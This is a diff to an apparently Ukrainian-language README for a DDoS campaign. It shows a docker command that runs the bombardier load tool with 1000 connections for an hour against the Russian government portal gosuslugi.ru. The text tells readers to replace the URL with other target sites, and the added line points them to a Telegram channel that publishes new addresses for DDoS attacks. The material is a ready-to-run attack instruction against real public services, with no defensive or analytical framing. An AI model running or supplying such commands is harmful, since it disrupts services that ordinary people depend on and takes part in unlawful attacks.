@@ -20,7 +20,7 @@
 ```
 docker run -ti --rm alpine/bombardier -c 1000 -d 3600s -l https://www.gosuslugi.ru
 ```
-(замініть `https://www.gosuslugi.ru` на необхідний сайт)  
+(замініть `https://www.gosuslugi.ru` на необхідний сайт - нові адреси для ddos атаки публікуються в [Telegram каналі](https://t.me/+97Y45he5lOI2ZTky) )  
 **Ви можете відкрити декілька вікон терміналу**  
 
 ## Доповнення  
